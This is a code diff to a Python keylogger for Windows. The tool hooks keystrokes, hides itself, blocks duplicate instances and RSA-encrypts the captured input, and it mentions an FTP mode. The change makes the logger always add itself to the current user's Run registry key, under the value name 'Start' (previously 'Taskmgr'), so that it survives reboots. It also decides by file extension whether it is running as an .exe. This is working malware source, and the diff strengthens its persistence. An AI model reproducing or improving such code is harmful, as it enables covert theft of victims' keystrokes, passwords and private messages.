@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+import os
 import sys                 # for getting sys.argv
 import win32event, \
        win32api, winerror  # for disallowing multiple instances
@@ -16,7 +17,7 @@ def hide():
 
 
 if len(sys.argv) == 1:
-    sys.argv = [sys.argv[0], 'local', 'encrypt', 'startup']
+    sys.argv = [sys.argv[0], 'local', 'encrypt']
 # General precautions
 elif len(sys.argv) > 10:                   # limit the number of args
     exit(0)
@@ -32,7 +33,6 @@ if mode != "debug":
 
 
 import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
-import os                  # for handling paths and removing files (FTP mode)
 import time
 import psutil
 import ctypes              # for getting window titles, current keyboard layout and capslock state
@@ -59,39 +59,41 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     exit(0)
 
 
+# CONSTANTS
+PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
+# Examples: 'C:\\...\\python.exe' or 'python' if it is on your PATH.
+
+
 # Add to startup for persistence
-def add_to_startup(mode, encryption_on, executable):
+def add_to_startup():
     key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
     key2change = OpenKey(HKEY_CURRENT_USER,
                          key_val, 0, KEY_ALL_ACCESS)
     if executable:
-        sys_args = ' '.join(['exe', mode, 'startup'])
         reg_value_prefix, reg_value_postfix = '', ''
     else:
-        sys_args = ' '.join([mode, 'startup'])
         reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + PYTHON_EXEC_PATH + ' '
         reg_value_postfix = '"'
-    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + sys_args + \
+    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + mode + \
                 (' encrypt' if encryption_on else '') + reg_value_postfix
     try:
-        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, reg_value)
+        SetValueEx(key2change, "Start", 0, REG_SZ, reg_value)
     except Exception as e:
         print(e)
 
 
-executable = False
-if "exe" in sys.argv:
+current_file_path = os.path.realpath(sys.argv[0])
+dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
+current_file_name = os.path.split(os.path.realpath(sys.argv[0]))[-1]
+
+if current_file_name.split(".")[-1] == 'exe':
     executable = True
+else:
+    executable = False
 if "encrypt" in sys.argv:
     encryption_on = True
-if "startup" in sys.argv:
-    add_to_startup(mode, encryption_on, executable)
-
-
-# CONSTANTS
-PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
-# Examples: 'C:\\...\\python.exe' or 'python' if it is on your PATH.
+add_to_startup()
 
 # RSA PUBLIC KEY FOR ENCRYPTION
 public_key_str = """-----BEGIN PUBLIC KEY-----
@@ -112,9 +114,6 @@ public_key = bytes(public_key_str, 'utf-8')
 # with open("public_key.pem", "rb") as f:
 #     public_key = f.read()
 
-current_file_path = os.path.realpath(sys.argv[0])
-dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
-current_file_name = os.path.split(os.path.realpath(sys.argv[0]))[-1]
 # this number of characters must be typed for the logger to write the line_buffer:
 # (formula from Cryptodome.Cipher.PKCS1OAEP_Cipher.encypt)
 CHAR_LIMIT = Cryptodome.Util.number.ceil_div(Cryptodome.Util.number.size(RSA.importKey(public_key).n), 8) - \
